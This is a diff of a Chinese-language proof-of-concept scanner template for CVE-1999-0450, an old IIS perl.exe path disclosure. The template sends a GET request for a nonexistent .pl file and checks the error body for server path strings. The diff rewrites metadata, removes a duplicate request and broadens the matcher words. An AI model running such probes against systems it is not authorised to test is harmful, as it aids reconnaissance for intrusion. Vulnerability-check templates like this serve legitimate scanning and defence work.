@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = '检测 Microsoft IIS 5.0 IISAPI 扩展（perl.exe）路径泄露漏洞。向服务器发送指向不存在 .pl 文件的 GET 请求，触发 Perl 解释器返回错误信息，其中包含 Web 服务器根目录的完整物理路径（如 C:\InetPub\scripts\），导致敏感路径信息泄露，攻击者可据此进行后续侦察。'
+author = "AVE"
+description = "通过向 IIS 服务器请求一个不存在的 .pl 文件，perl.exe 处理请求后返回的错误信息中会泄露 Web 服务器的真实物理路径，攻击者可据此获取敏感信息。"
 id = "POC-AVE-1999-0688"
-name = "Microsoft IIS 5.0 IISAPI Extension Root Directory Enumeration PoC"
+name = "Microsoft IIS perl.exe HTTP Path Disclosure PoC"
 severity = "high"
-tags = ["ave-1999-0688"]
+tags = ["cve-1999-0450"]
 vuln_id = [
     "CVE-1999-0450",
     "AVE-1999-0688",
@@ -23,20 +23,15 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Can't open perl script",
-    'C:\InetPub',
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/scripts/bogus.pl"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Can't open perl script",
-    'C:\InetPub',
+    "物理路径",
+    "Physical Path",
+    'C:\',
+    'D:\',
+    'E:\',
+    "/usr/",
+    "/var/",
+    "/home/",
+    "Directory",
+    "cannot find",
+    "Can't locate",
 ]
